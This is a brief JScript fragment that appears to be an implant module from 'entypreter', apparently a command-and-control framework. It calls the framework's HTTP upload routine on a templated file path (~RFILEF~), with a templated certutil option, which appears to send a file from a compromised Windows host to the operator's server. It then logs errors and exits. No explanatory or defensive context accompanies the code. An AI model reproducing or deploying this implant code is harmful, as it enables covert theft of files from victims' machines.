try
{
    entypreter.http.upload("~RFILEF~", "data", ~CERTUTIL~);
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
